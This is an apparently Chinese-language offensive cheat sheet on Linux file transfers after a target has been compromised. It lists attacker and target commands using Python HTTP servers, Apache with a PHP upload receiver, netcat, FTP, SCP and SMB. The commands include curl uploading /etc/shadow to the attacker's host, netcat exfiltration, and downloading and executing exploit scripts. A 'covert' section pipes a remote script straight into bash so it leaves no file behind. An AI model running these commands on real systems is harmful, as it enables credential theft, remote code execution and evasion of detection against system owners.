---
description: 在目标系统中已经成功建立立足点后，需要传输一些脚本到目标系统中，以实现后续的提权操作
---

# ✔️ Linux文件传输 - Linux File Transfers

## 常规方式

### 利用Python传输：

```bash
// Attacker
python3 -m http.server 8888
```

```bash
// Target
wget http://攻方IP:8888/利用脚本.sh
chmod +x 利用脚本.sh
利用脚本.sh
```

### 利用Apache2传输：

```
// Attacker
1. 准备好upload.php文件，放在/var/www/html目录下；
2. 同时在/var/www/html目录下再创建一个/uploads目录，用于存放稍后从目标系统中传回的敏感文件；
```

```bash
// Target
curl --form "uploadedfile=@/etc/shadow" http://攻方IP/upload.php
```

```php
// upload.php
<?php  
$target_path = "uploads/";
$target_path = $target_path.basename($_FILES['uploadedfile']['name']);

echo "Source=".$_FILES['uploadedfile']['name']."<br/>";
echo "Target path=".$target_path."<br/>";
echo "Size=".$_FILES['uploadedfile']['size']."<br/>";

if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)){
	echo "The file".basename($_FILES['uploadedfile']['name'])."has been uploaded";
}else{
	echo "There was an error uploading the file,please try again!"
}

?>
```

### 利用Netcat传输

```bash
// Attacker
nc -lvp 1234 > 传回的文件名 
```

```bash
// Target
nc 攻方IP 1234 < 待传回的文件名
```

### 利用FTP传输

```bash
// Attacker
sudo python3 -m pyftpdlib  -p 21 -w
python -m pyftpdlib -p 21
```

```bash
// Target
ftp -A 攻方IP
dir               # 查找要传到目标上的程序，本例为：winPEAS.exe
get winPEAS.exe
bye
```

### 利用SCP传输

```bash
// Attacker
scp 待传输文件的路径 目标用户命@目标IP:传输后保存的路径
```

### 利用SMB客户端传输

前提条件：**已安装smbclient**

```bash
// 格式：
smbclient //server_ip/share_name -U username
```

启动了一个 SMB 服务器，允许其他设备通过 SMB 协议与之通信，并在本地文件系统的当前目录下共享文件（本例为 "liodeus"）：

```bash
// Attacker
sudo smbserver.py -smb2support liodeus .
```

```bash
// Target
smbclient //攻方IP/liodeus -U 用户名
// 连接成功后，查找对应文件，并下载到目标本机中(本例为 "liodeus")：
ls
get liodeus
// 还可以从目标机器里上传文件到攻方SMB服务器：
put 文件名
quit
```



## 隐蔽方式

```bash
// Attacker
python3 -m http.server 8888
```

```
// Target
curl http://攻方IP:8888/利用脚本.sh | bash
```

MEMO：该利用脚本不会被保存在目标系统中
